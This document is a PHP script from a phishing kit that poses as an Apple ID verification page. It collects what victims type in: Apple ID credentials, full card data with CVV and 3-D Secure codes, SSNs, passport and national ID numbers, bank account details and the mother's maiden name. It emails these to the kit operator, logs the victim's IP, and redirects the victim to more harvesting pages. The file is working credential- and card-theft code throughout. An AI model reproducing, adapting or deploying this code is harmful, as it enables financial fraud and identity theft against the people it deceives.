<?php
session_start();
$idnum = $_SESSION['idnumber'];
$qatarid = $_SESSION['qatarid'];
$civilid = $_SESSION['civilid'];
$nationalid = $_SESSION['nationalid'];
$citizenid = $_SESSION['citizenid'];
$passport = $_SESSION['passportnumber'];
$bank_num = $_POST['bankaccnumber'];
$cassn = $_SESSION['cassn'];
$ssn = $_SESSION['ssn'];
$acc_number = $_SESSION['acc_number'];
$osid = $_SESSION['osidnum'];
$banknya = $_SESSION['bank_name'];
$sort = $_POST['sortcode'];
$driver = $_POST['driver_license'];
$nameofcard = $_SESSION['ccname'];
$nabid = $_POST['nabid'];
$bsbnumber = $_POST['bsbnumber'];
$membernumber = $_POST['membernumber'];
$anzcustomer = $_POST['anzcustomer'];
$postbankid = $_POST['postbankid'];
$agent = $_SERVER['HTTP_USER_AGENT'];
if($_SESSION['ccnumber'] == "") {
	exit();
}
$expirednya = $_SESSION['ccexpired'];
$tahun = substr($expirednya,5,6);
$bulan = substr($expirednya,0,2);
$expirednya = "$bulan|$tahun";


if($_SESSION['country'] == "Japan") {
	$vbvjp = strlen($_POST['vbv_jp']);
	if($vbvjp == 4 and is_numeric($_POST['vbv_jp'])) {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=vbv&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=1'>";
		exit();
	}
}

if($setting['mix_result'] == 'on') {
	session_start();
	$message  = "########################### Mantuoluo ##########################\n";
	$message .= "######################### LOGIN DETAILS #########################\n";
	$message .= "🎉 Apple ID			: ".$_SESSION['email']."\n";
	$message .= "🎉 Password			: ".$_SESSION['password']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 Bank			: ".$_SESSION['bank_name']."\n";
	$message .= "🎉 Type			: ".$_SESSION['bank_scheme']." - ".$_SESSION['bank_type']."\n";
	$message .= "🎉 Level			: ".$_SESSION['bank_brand']."\n";
	$message .= "🎉 Cardholders    : ".$_SESSION['ccname']."\n";
	$message .= "🎉 CC Number		: ".$_SESSION['ccnumber']."\n";
	$message .= "🎉 Expired		: ".$_SESSION['ccexpired']."\n";
	$message .= "🎉 CVV			: ".$_SESSION['cccvv']."\n";
	$message .= "🎉 AMEX CID    	: ".$_SESSION['cid']."\n";
	$message .= "🎉 Copy			: ".$_SESSION['ccnumber']."|".$exp_copy."|".$_SESSION['cccvv']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 First Name		: ".$_SESSION['firstname']."\n";
	$message .= "🎉 Last Name		: ".$_SESSION['lastname']."\n";
	$message .= "🎉 Address 		: ".$_SESSION['address1']."\n";
	$message .= "🎉 City			: ".$_SESSION['city']."\n";
	$message .= "🎉 State			: ".$_SESSION['state']."\n";
	$message .= "🎉 Country		: ".$_SESSION['country']."\n";
	$message .= "🎉 Zip			: ".$_SESSION['zip']."\n";
	$message .= "🎉 BirthDay		: ".$_SESSION['dob']."\n";
	$message .= "🎉 Phone			: ".$_SESSION['phone']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 Mother Maiden name			: ".$_POST['Mname']."\n";
	$message .= "🎉 Secure code				: ".$_POST['vbv']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 WEB ID						: ".$_POST['cardid']."\n";
	$message .= "🎉 Card Password				: ".$_POST['vbv_jp']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 Social Security Number		: ".$ssn."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 ID Number					: ".$idnum."\n";
	$message .= "🎉 Civil ID					: ".$civilid."\n";
	$message .= "🎉 Qatar ID					: ".$qatarid."\n";
	$message .= "🎉 National ID				: ".$nationalid."\n";
	$message .= "🎉 Citizen ID					: ".$citizenid."\n";
	$message .= "🎉 NAB ID						: ".$nabid."\n";
	$message .= "🎉 BSB Number					: ".$bsbnumber."\n";
	$message .= "🎉 ANZ Customer 				: ".$anzcustomer."\n";
	$message .= "🎉 Postbank ID 				: ".$postbankid."\n";
	$message .= "🎉 Member Number				: ".$membernumber."\n";
	$message .= "🎉 Passport Number			: ".$passport."\n";
	$message .= "🎉 Bank Access Number			: ".$bank_num."\n";
	$message .= "🎉 Social Insurance Number	: ".$cassn."\n";
	$message .= "🎉 Account Number				: ".$acc_number."\n";
	$message .= "🎉 Sort Code					: ".$sort."\n";
	$message .= "🎉 OSID Number				: ".$osid."\n";
	$message .= "🎉 Credit Limit				: ".$_SESSION['cc_limit']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 IP Address		: ".$ip2."\n";
	$message .= "🎉 Region		    : ".$regioncity."\n";
	$message .= "🎉 City		    : ".$citykota."\n";
	$message .= "🎉 Continent		: ".$continent."\n";
	$message .= "🎉 Timezone		: ".$timezone."\n";
	$message .= "🎉 OS/Browser		: ".$os." / ".$br."\n";
	$message .= "🎉 Date			: ".$date."\n";
	$message .= "🎉 User Agent		: ".$agent."\n";
	$message .= "##################################################################\n";
}else{
	$message  = "########################### VBV INFO ############################\n";
	$message .= "🎉 Cardholders				: ".$_SESSION['ccname']."\n";
	$message .= "🎉 CC Number					: ".$_SESSION['ccnumber']."\n";
	$message .= "🎉 Expired					: ".$_SESSION['ccexpired']."\n";
	$message .= "🎉 CVV						: ".$_SESSION['cccvv']."\n";
	$message .= "🎉 Date of birth				: ".$_SESSION['date']."\n";
	$message .= "🎉 Mother Maiden name			: ".$_POST['Mname']."\n";
	$message .= "🎉 AMEX CID 					: ".$_SESSION['cid']."\n";
	$message .= "🎉 Secure code				: ".$_POST['vbv']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 WEB ID						: ".$_POST['cardid']."\n";
	$message .= "🎉 Card Password				: ".$_POST['vbv_jp']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 Social Security Number		: ".$ssn."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 ID Number					: ".$idnum."\n";
	$message .= "🎉 Civil ID					: ".$civilid."\n";
	$message .= "🎉 Qatar ID					: ".$qatarid."\n";
	$message .= "🎉 National ID				: ".$nationalid."\n";
	$message .= "🎉 Citizen ID					: ".$citizenid."\n";
	$message .= "🎉 NAB ID						: ".$nabid."\n";
	$message .= "🎉 BSB Number					: ".$bsbnumber."\n";
	$message .= "🎉 ANZ Customer 				: ".$anzcustomer."\n";
	$message .= "🎉 Postbank ID 				: ".$postbankid."\n";
	$message .= "🎉 Member Number				: ".$membernumber."\n";
	$message .= "🎉 Passport Number			: ".$passport."\n";
	$message .= "🎉 Bank Access Number			: ".$bank_num."\n";
	$message .= "🎉 Social Insurance Number	: ".$cassn."\n";
	$message .= "🎉 Account Number				: ".$acc_number."\n";
	$message .= "🎉 Sort Code					: ".$sort."\n";
	$message .= "🎉 OSID Number				: ".$osid."\n";
	$message .= "🎉 Credit Limit				: ".$_SESSION['cc_limit']."\n";
	$message .= "##################################################################\n";
	$message .= "🎉 IP Address		: ".$ip2."\n";
	$message .= "🎉 Region		    : ".$regioncity."\n";
	$message .= "🎉 City		    : ".$citykota."\n";
	$message .= "🎉 Continent		: ".$continent."\n";
	$message .= "🎉 Timezone		: ".$timezone."\n";
	$message .= "🎉 OS/Browser		: ".$os." / ".$br." / ".$cn."\n";
	$message .= "🎉 Date			: ".$date."\n";
	$message .= "🎉 User Agent		: ".$agent."\n";
	$message .= "##################################################################\n";
}

if($setting['mix_result'] == 'on') {
	if($_SESSION['cc_brand'] == "") {
		$subject = "💳 CARD VBV - ".$_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_name']." [ $cn - $os - $ip2 ]";
		$subbin = "💳 CARD VBV - ".$_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_name'];
		
	}else{
		$subject = "💳 NEW CC - ".$_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_brand']." ".$_SESSION['bank_name']." [ $cn - $os - $ip2 ]";
		$subbin = "💳 NEW CC - ".$_SESSION['bank_bin']." - ".$_SESSION['bank_scheme']." ".$_SESSION['bank_type']." ".$_SESSION['bank_brand']." ".$_SESSION['bank_name'];
	}
	
}else{
    $subject = "💳 CARD VBV - ".$_SESSION['email']." [ $cn - $os - $ip2 ]";
}
$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
kirim_mail($to,$from,$subject,$message);

$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi VBV"."\n");
fclose($click);

$click = fopen("../result/total_vbv.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
validate();

if($setting['mix_result'] == 'on') {
		$click = fopen("../result/total_cc.txt","a");
    	fwrite($click,"$ip2"."\n");
    	fclose($click);
    	$click = fopen("../result/total_bin.txt","a");
    	fwrite($click,"$subbin"."\n");
    	fclose($click);
}

if($double_cc == 'on') {
	if($_SESSION['cc_kedua'] == "") {
		$_SESSION['cc_kedua'] = "done";
		$_SESSION['data_submit'] = "";
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
		exit();
	}
}

if($get_bank == 'on' and $_SESSION['country'] == "United States") {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=../account?view=bankus&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	exit();
}else{
	if($getphoto == 'on') {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
	}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
	}
}
?>